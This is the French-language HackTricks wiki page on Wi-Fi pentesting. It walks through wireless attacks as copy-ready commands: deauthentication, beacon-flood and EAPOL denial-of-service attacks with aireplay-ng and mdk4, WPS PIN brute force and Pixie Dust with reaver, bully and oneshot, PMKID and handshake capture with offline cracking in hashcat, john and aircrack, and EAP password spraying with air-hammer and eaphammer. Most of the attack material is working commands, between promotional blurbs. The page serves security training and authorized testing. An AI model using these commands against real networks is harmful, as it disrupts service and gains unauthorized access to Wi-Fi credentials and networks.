# Pentesting Wifi

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le [**serveur Discord HackenProof**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Aper√ßus du Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des nouveaux programmes de bug bounty lanc√©s et des mises √† jour cruciales des plateformes

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Wifi commandes de base
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ex√©cutez airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un mod√®le de phishing pour r√©ussir √† obtenir le vrai mot de passe du r√©seau ou capturer des identifiants de r√©seaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il va automatiquement :

* Mettre l'interface en mode moniteur
* Scanner les r√©seaux possibles - Et vous permettre de s√©lectionner la ou les victimes
* Si WEP - Lancer des attaques WEP
* Si WPA-PSK
* Si WPS : attaque Pixie dust et attaque par bruteforce (faites attention, l'attaque par bruteforce peut prendre beaucoup de temps). Notez qu'il n'essaie pas de PIN nulle ou de PINs g√©n√©r√©s.
* Essayer de capturer le PMKID de l'AP pour le cracker
* Essayer de d√©sauthentifier les clients de l'AP pour capturer un handshake
* Si PMKID ou Handshake, essayer de bruteforcer en utilisant les 5000 mots de passe les plus courants.

## Attacks Summary

* **DoS**
* D√©sauthentification/dissociation -- D√©connecter tout le monde (ou un ESSID/Client sp√©cifique)
* APs factices al√©atoires -- Cacher des r√©seaux, possible crash des scanners
* Surcharger l'AP -- Essayer de tuer l'AP (g√©n√©ralement pas tr√®s utile)
* WIDS -- Jouer avec l'IDS
* TKIP, EAPOL -- Quelques attaques sp√©cifiques pour DoS certains APs
* **Cracking**
* Craquer **WEP** (plusieurs outils et m√©thodes)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** bruteforce
* \[DoS +] **WPA handshake** capture + Cracking
* **WPA-MGT**
* **Capture de nom d'utilisateur**
* **Bruteforce** des identifiants
* **Evil Twin** (avec ou sans DoS)
* **Open** Evil Twin \[+ DoS] -- Utile pour capturer les identifiants de portail captif et/ou effectuer des attaques LAN
* **WPA-PSK** Evil Twin -- Utile pour des attaques r√©seau si vous connaissez le mot de passe
* **WPA-MGT** -- Utile pour capturer les identifiants d'entreprise
* **KARMA, MANA**, **Loud MANA**, **Beacon connu**
* **+ Open** -- Utile pour capturer les identifiants de portail captif et/ou effectuer des attaques LAN
* **+ WPA** -- Utile pour capturer les handshakes WPA

## DOS

### Paquets de d√©sauthentification

**Description de** [**ici**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Les attaques de **d√©sauthentification**, une m√©thode r√©pandue dans le hacking Wi-Fi, impliquent la falsification de trames "de gestion" pour **d√©connecter de force les appareils d'un r√©seau**. Ces paquets non chiffr√©s trompent les clients en leur faisant croire qu'ils proviennent du r√©seau l√©gitime, permettant aux attaquants de collecter des handshakes WPA √† des fins de cracking ou de perturber de mani√®re persistante les connexions r√©seau. Cette tactique, alarmante par sa simplicit√©, est largement utilis√©e et a des implications significatives pour la s√©curit√© des r√©seaux.

**D√©sauthentification utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 signifie d√©sauthentification
* 1 est le nombre de d√©sauthentifications √† envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
* \-a 00:14:6C:7E:40:80 est l'adresse MAC du point d'acc√®s
* \-c 00:0F:B5:34:30:30 est l'adresse MAC du client √† d√©sauthentifier ; si cela est omis, une d√©sauthentification en broadcast est envoy√©e (ne fonctionne pas toujours)
* ath0 est le nom de l'interface

### Paquets de d√©sassociation

**Les paquets de d√©sassociation**, similaires aux paquets de d√©sauthentification, sont un type de trame de gestion utilis√©e dans les r√©seaux Wi-Fi. Ces paquets servent √† rompre la connexion entre un appareil (tel qu'un ordinateur portable ou un smartphone) et un point d'acc√®s (AP). La principale distinction entre d√©sassociation et d√©sauthentification r√©side dans leurs sc√©narios d'utilisation. Alors qu'un AP √©met **des paquets de d√©sauthentification pour retirer explicitement des appareils ind√©sirables du r√©seau, les paquets de d√©sassociation sont g√©n√©ralement envoy√©s lorsque l'AP subit un arr√™t**, un red√©marrage ou un d√©placement, n√©cessitant ainsi la d√©connexion de tous les n≈ìuds connect√©s.

**Cette attaque peut √™tre effectu√©e par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Dans** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b : Inondation de balises**

Envoie des trames de balise pour afficher de faux AP aux clients. Cela peut parfois faire planter les analyseurs de r√©seau et m√™me les pilotes !
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a : D√©ni de Service d'Authentification**

L'envoi de trames d'authentification √† tous les Points d'Acc√®s (AP) accessibles dans la port√©e peut surcharger ces AP, surtout lorsque de nombreux clients sont impliqu√©s. Ce trafic intense peut entra√Æner une instabilit√© du syst√®me, provoquant le gel ou m√™me le red√©marrage de certains AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p : Probing SSID et Brutefor√ßage**

Le probing des Points d'Acc√®s (APs) v√©rifie si un SSID est correctement r√©v√©l√© et confirme la port√©e de l'AP. Cette technique, coupl√©e avec le **brutefor√ßage des SSIDs cach√©s** avec ou sans liste de mots, aide √† identifier et acc√©der aux r√©seaux dissimul√©s.

**MODE D'ATTAQUE m : Exploitation des Contre-mesures Michael**

L'envoi de paquets al√©atoires ou dupliqu√©s √† diff√©rentes files d'attente QoS peut d√©clencher les Contre-mesures Michael sur les **APs TKIP**, entra√Ænant un arr√™t de l'AP d'une minute. Cette m√©thode est une tactique efficace d'attaque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e : Injection de paquets EAPOL Start et Logoff**

Inonder un AP avec des **trames EAPOL Start** cr√©e des **sessions factices**, submergeant l'AP et bloquant les clients l√©gitimes. Alternativement, l'injection de **faux messages EAPOL Logoff** d√©connecte de force les clients, les deux m√©thodes perturbent efficacement le service r√©seau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s : Attaques pour les r√©seaux maill√©s IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les r√©seaux maill√©s.

**MODE D'ATTAQUE w : Confusion WIDS**

La connexion crois√©e de clients √† plusieurs n≈ìuds WDS ou √† des APs malveillants peut manipuler les syst√®mes de d√©tection et de pr√©vention d'intrusion, cr√©ant de la confusion et un potentiel abus du syst√®me.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f : Fuzzer de Paquets**

Un fuzzer de paquets avec diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation de paquets.

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques mentionn√©es dans les commentaires pr√©c√©dents :

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifie le processus de connexion des appareils √† un routeur, am√©liorant la vitesse et la facilit√© de configuration pour les r√©seaux crypt√©s avec **WPA** ou **WPA2** Personnel. Il est inefficace pour la s√©curit√© WEP facilement compromise. WPS utilise un PIN √† 8 chiffres, valid√© en deux moiti√©s, ce qui le rend vuln√©rable aux attaques par force brute en raison de son nombre limit√© de combinaisons (11 000 possibilit√©s).

### Bruteforce WPS

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

* **Reaver** a √©t√© con√ßu pour √™tre une attaque robuste et pratique contre WPS, et a √©t√© test√© contre une grande vari√©t√© de points d'acc√®s et d'impl√©mentations WPS.
* **Bully** est une **nouvelle impl√©mentation** de l'attaque par force brute WPS, √©crite en C. Il pr√©sente plusieurs avantages par rapport au code reaver original : moins de d√©pendances, am√©lioration des performances m√©moire et CPU, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

L'attaque exploite la **vuln√©rabilit√© du PIN WPS**, en particulier son exposition des quatre premiers chiffres et le r√¥le du dernier chiffre en tant que somme de contr√¥le, facilitant l'attaque par force brute. Cependant, les d√©fenses contre les attaques par force brute, comme **le blocage des adresses MAC** des attaquants agressifs, n√©cessitent une **rotation des adresses MAC** pour continuer l'attaque.

Apr√®s avoir obtenu le PIN WPS avec des outils comme Bully ou Reaver, l'attaquant peut d√©duire le PSK WPA/WPA2, garantissant un **acc√®s r√©seau persistant**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche raffin√©e cible les PIN WPS en utilisant des vuln√©rabilit√©s connues :

1. **PINs pr√©-d√©couverts** : Utilisez une base de donn√©es de PINs connus li√©s √† des fabricants sp√©cifiques connus pour utiliser des PINs WPS uniformes. Cette base de donn√©es corr√®le les trois premiers octets des adresses MAC avec des PINs probables pour ces fabricants.
2. **Algorithmes de g√©n√©ration de PIN** : Exploitez des algorithmes comme ComputePIN et EasyBox, qui calculent les PINs WPS en fonction de l'adresse MAC de l'AP. L'algorithme Arcadyan n√©cessite √©galement un identifiant de dispositif, ajoutant une couche au processus de g√©n√©ration de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** a d√©couvert un d√©faut dans certains Points d'Acc√®s (APs) concernant la cr√©ation de codes secrets, connus sous le nom de **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent √™tre d√©couverts, le craquage du PIN WPS de l'AP devient facile. L'AP r√©v√®le le PIN dans un code sp√©cial (hash) pour prouver qu'il est l√©gitime et non un AP faux (rogue). Ces nonces sont essentiellement les "cl√©s" pour d√©verrouiller le "coffre-fort" qui contient le PIN WPS. Plus d'informations √† ce sujet peuvent √™tre trouv√©es [ici](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

En termes simples, le probl√®me est que certains APs n'utilisaient pas des cl√©s suffisamment al√©atoires pour chiffrer le PIN pendant le processus de connexion. Cela rend le PIN vuln√©rable √† √™tre devin√© depuis l'ext√©rieur du r√©seau (attaque par force brute hors ligne).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne souhaitez pas passer l'appareil en mode moniteur, ou si `reaver` et `bully` rencontrent un probl√®me, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une attaque Pixie Dust sans avoir √† passer en mode moniteur.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Attaque Null Pin

Certains syst√®mes mal con√ßus permettent m√™me √† un **Null PIN** (un PIN vide ou inexistant) d'accorder l'acc√®s, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vuln√©rabilit√©, contrairement √† **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Tous les attaques WPS propos√©es peuvent √™tre facilement r√©alis√©es en utilisant _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 et 6 vous permettent d'essayer **votre PIN personnalis√©** (si vous en avez un)
* 7 et 8 effectuent l'**attaque Pixie Dust**
* 13 vous permet de tester le **PIN NULL**
* 11 et 12 vont **rassembler les PIN li√©s √† l'AP s√©lectionn√© √† partir des bases de donn√©es disponibles** et **g√©n√©rer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et √©ventuellement Arcadyan (recommand√©, pourquoi pas ?)
* 9 et 10 testeront **tous les PIN possibles**

## **WEP**

Tellement cass√© et inutilis√© de nos jours. Sachez simplement que _**airgeddon**_ a une option WEP appel√©e "All-in-One" pour attaquer ce type de protection. Plus d'outils offrent des options similaires.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Aper√ßus du Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des nouvelles primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

***

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [a r√©v√©l√©](https://hashcat.net/forum/thread-7717.html) une nouvelle m√©thode d'attaque, unique car elle n√©cessite **un seul paquet** et ne n√©cessite aucun client connect√© √† l'AP cible‚Äîjuste une interaction entre l'attaquant et l'AP.

De nombreux routeurs modernes ajoutent un **champ optionnel** au **premier cadre EAPOL** lors de l'association, connu sous le nom de `Robust Security Network`. Cela inclut le `PMKID`.

Comme l'explique le post original, le **PMKID** est cr√©√© en utilisant des donn√©es connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
√âtant donn√© que le "Nom PMK" est constant, nous connaissons le BSSID de l'AP et de la station, et le `PMK` est identique √† celui d'une poign√©e de main compl√®te en 4 √©tapes, **hashcat** peut utiliser ces informations pour craquer le PSK et r√©cup√©rer le mot de passe !

Pour **rassembler** ces informations et **bruteforcer** localement le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captur√©s** seront affich√©s dans la **console** et √©galement **enregistr√©s** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et craquez-le :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si le v√¥tre **ne contient que** **3 parties**, alors, il est **invalide** (la capture PMKID n'√©tait pas valide).

Notez que `hcxdumptool` **capture √©galement des handshakes** (quelque chose comme ceci appara√Ætra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pourriez **transformer** les **handshakes** au format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqu√© que certaines captures de handshakes avec cet outil ne pouvaient pas √™tre craqu√©es m√™me en connaissant le mot de passe correct. Je recommanderais de capturer des handshakes √©galement de mani√®re traditionnelle si possible, ou de capturer plusieurs d'entre eux en utilisant cet outil._

### Capture de handshake

Une attaque sur les r√©seaux **WPA/WPA2** peut √™tre ex√©cut√©e en capturant un **handshake** et en essayant de **craquer** le mot de passe **hors ligne**. Ce processus implique de surveiller la communication d'un r√©seau sp√©cifique et le **BSSID** sur un **canal** particulier. Voici un guide simplifi√© :

1. Identifiez le **BSSID**, le **canal** et un **client connect√©** du r√©seau cible.
2. Utilisez `airodump-ng` pour surveiller le trafic r√©seau sur le canal et le BSSID sp√©cifi√©s, en esp√©rant capturer un handshake. La commande ressemblera √† ceci :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter les chances de capturer un handshake, d√©connectez momentan√©ment le client du r√©seau pour forcer une r√©-authentification. Cela peut √™tre fait en utilisant la commande `aireplay-ng`, qui envoie des paquets de d√©sauthentification au client :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Notez qu'une fois que le client a √©t√© d√©sauthentifi√©, il pourrait essayer de se connecter √† un autre AP ou, dans d'autres cas, √† un autre r√©seau._

Une fois que dans `airodump-ng` apparaissent des informations de handshake, cela signifie que le handshake a √©t√© captur√© et vous pouvez arr√™ter d'√©couter :

![](<../../.gitbook/assets/image (172) (1).png>)

Une fois le handshake captur√©, vous pouvez **crack** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### V√©rifiez si le handshake est dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_If this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Dans **les configurations WiFi d'entreprise, vous rencontrerez diverses m√©thodes d'authentification**, chacune offrant diff√©rents niveaux de s√©curit√© et fonctionnalit√©s de gestion. Lorsque vous utilisez des outils comme `airodump-ng` pour inspecter le trafic r√©seau, vous pourriez remarquer des identifiants pour ces types d'authentification. Certaines m√©thodes courantes incluent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Cette m√©thode prend en charge les jetons mat√©riels et les mots de passe √† usage unique au sein de EAP-PEAP. Contrairement √† MSCHAPv2, elle n'utilise pas de d√©fi entre pairs et envoie les mots de passe en texte clair au point d'acc√®s, posant un risque pour les attaques de r√©trogradation.
2. **EAP-MD5 (Message Digest 5)**:
* Implique l'envoi du hachage MD5 du mot de passe depuis le client. Il est **non recommand√©** en raison de la vuln√©rabilit√© aux attaques par dictionnaire, du manque d'authentification du serveur et de l'incapacit√© √† g√©n√©rer des cl√©s WEP sp√©cifiques √† la session.
3. **EAP-TLS (Transport Layer Security)**:
* Utilise √† la fois des certificats c√¥t√© client et c√¥t√© serveur pour l'authentification et peut g√©n√©rer dynamiquement des cl√©s WEP bas√©es sur l'utilisateur et la session pour s√©curiser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Fournit une authentification mutuelle via un tunnel crypt√©, ainsi qu'une m√©thode pour d√©river des cl√©s WEP dynamiques, par utilisateur et par session. Elle n√©cessite uniquement des certificats c√¥t√© serveur, les clients utilisant des identifiants.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Fonctionne de mani√®re similaire √† EAP en cr√©ant un tunnel TLS pour une communication prot√©g√©e. Elle permet l'utilisation de protocoles d'authentification plus faibles au-dessus de EAP en raison de la protection offerte par le tunnel.
* **PEAP-MSCHAPv2**: Souvent appel√© PEAP, il combine le m√©canisme de d√©fi/r√©ponse vuln√©rable MSCHAPv2 avec un tunnel TLS protecteur.
* **PEAP-EAP-TLS (ou PEAP-TLS)**: Semblable √† EAP-TLS mais initie un tunnel TLS avant d'√©changer des certificats, offrant une couche de s√©curit√© suppl√©mentaire.

Vous pouvez trouver plus d'informations sur ces m√©thodes d'authentification [ici](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) et [ici](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture de nom d'utilisateur

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), il semble que si vous utilisez **EAP**, les **messages "Identity"** doivent √™tre **pris en charge**, et le **nom d'utilisateur** sera envoy√© en **clair** dans les **messages "Response Identity"**.

M√™me en utilisant l'une des m√©thodes d'authentification les plus s√©curis√©es : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoy√© dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (d√©marrez `airodump-ng` dans un canal et `wireshark` dans la m√™me interface) et filtrez les paquets par `eapol`.\
√Ä l'int√©rieur du paquet "**Response, Identity**", le **nom d'utilisateur** du client appara√Ætra.

![](<../../.gitbook/assets/image (850).png>)

### Identit√©s anonymes

Le masquage d'identit√© est pris en charge √† la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un r√©seau WiFi, une demande d'EAP-Identity est g√©n√©ralement initi√©e par le point d'acc√®s (AP) lors du processus d'association. Pour garantir la protection de l'anonymat de l'utilisateur, la r√©ponse du client EAP sur l'appareil de l'utilisateur contient uniquement les informations essentielles requises pour que le serveur RADIUS initial traite la demande. Ce concept est illustr√© par les sc√©narios suivants :

* EAP-Identity = anonyme
* Dans ce sc√©nario, tous les utilisateurs utilisent le pseudonyme "anonyme" comme identifiant utilisateur. Le serveur RADIUS initial fonctionne comme un serveur EAP-PEAP ou EAP-TTLS, responsable de la gestion du c√¥t√© serveur du protocole PEAP ou TTLS. La m√©thode d'authentification interne (prot√©g√©e) est ensuite soit g√©r√©e localement, soit d√©l√©gu√©e √† un serveur RADIUS distant (domicile).
* EAP-Identity = anonyme@realm\_x
* Dans cette situation, les utilisateurs de diff√©rents royaumes cachent leurs identit√©s tout en indiquant leurs royaumes respectifs. Cela permet au serveur RADIUS initial de faire passer les demandes EAP-PEAP ou EAP-TTLS aux serveurs RADIUS dans leurs royaumes d'origine, qui agissent comme le serveur PEAP ou TTLS. Le serveur RADIUS initial fonctionne uniquement comme un n≈ìud de relais RADIUS.
* Alternativement, le serveur RADIUS initial peut fonctionner comme le serveur EAP-PEAP ou EAP-TTLS et soit g√©rer la m√©thode d'authentification prot√©g√©e, soit la transf√©rer √† un autre serveur. Cette option facilite la configuration de politiques distinctes pour divers royaumes.

Dans EAP-PEAP, une fois le tunnel TLS √©tabli entre le serveur PEAP et le client PEAP, le serveur PEAP initie une demande d'EAP-Identity et la transmet par le tunnel TLS. Le client r√©pond √† cette seconde demande d'EAP-Identity en envoyant une r√©ponse d'EAP-Identity contenant la v√©ritable identit√© de l'utilisateur √† travers le tunnel crypt√©. Cette approche emp√™che efficacement la r√©v√©lation de la v√©ritable identit√© de l'utilisateur √† quiconque espionnant le trafic 802.11.

EAP-TTLS suit une proc√©dure l√©g√®rement diff√©rente. Avec EAP-TTLS, le client s'authentifie g√©n√©ralement en utilisant PAP ou CHAP, s√©curis√© par le tunnel TLS. Dans ce cas, le client inclut un attribut User-Name et soit un attribut Password soit un attribut CHAP-Password dans le message TLS initial envoy√© apr√®s l'√©tablissement du tunnel.

Quel que soit le protocole choisi, le serveur PEAP/TTLS obtient connaissance de la v√©ritable identit√© de l'utilisateur apr√®s l'√©tablissement du tunnel TLS. La v√©ritable identit√© peut √™tre repr√©sent√©e comme user@realm ou simplement user. Si le serveur PEAP/TTLS est √©galement responsable de l'authentification de l'utilisateur, il poss√®de maintenant l'identit√© de l'utilisateur et proc√®de avec la m√©thode d'authentification prot√©g√©e par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transf√©rer une nouvelle demande RADIUS au serveur RADIUS d'origine de l'utilisateur. Cette nouvelle demande RADIUS omet la couche de protocole PEAP ou TTLS. Dans les cas o√π la m√©thode d'authentification prot√©g√©e est EAP, les messages EAP internes sont transmis au serveur RADIUS d'origine sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la v√©ritable identit√© de l'utilisateur, rempla√ßant le User-Name anonyme de la demande RADIUS entrante. Lorsque la m√©thode d'authentification prot√©g√©e est PAP ou CHAP (prise en charge uniquement par TTLS), les attributs User-Name et autres attributs d'authentification extraits de la charge utile TLS sont substitu√©s dans le message RADIUS sortant, rempla√ßant le User-Name anonyme et les attributs TTLS EAP-Message trouv√©s dans la demande RADIUS entrante.

Pour plus d'infos, consultez [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Si le client est cens√© utiliser un **nom d'utilisateur et un mot de passe** (notez que **EAP-TLS ne sera pas valide** dans ce cas), alors vous pourriez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la partie suivante) et de **mots de passe** et essayer de **bruteforcer** l'acc√®s en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez √©galement effectuer cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Th√©orie des attaques client

### S√©lection de r√©seau et itin√©rance

* Le protocole 802.11 d√©finit comment une station rejoint un Extended Service Set (ESS) mais ne sp√©cifie pas les crit√®res de s√©lection d'un ESS ou d'un point d'acc√®s (AP) √† l'int√©rieur.
* Les stations peuvent itin√©rer entre les AP partageant le m√™me ESSID, maintenant la connectivit√© √† travers un b√¢timent ou une zone.
* Le protocole exige l'authentification de la station √† l'ESS mais ne mandate pas l'authentification de l'AP √† la station.

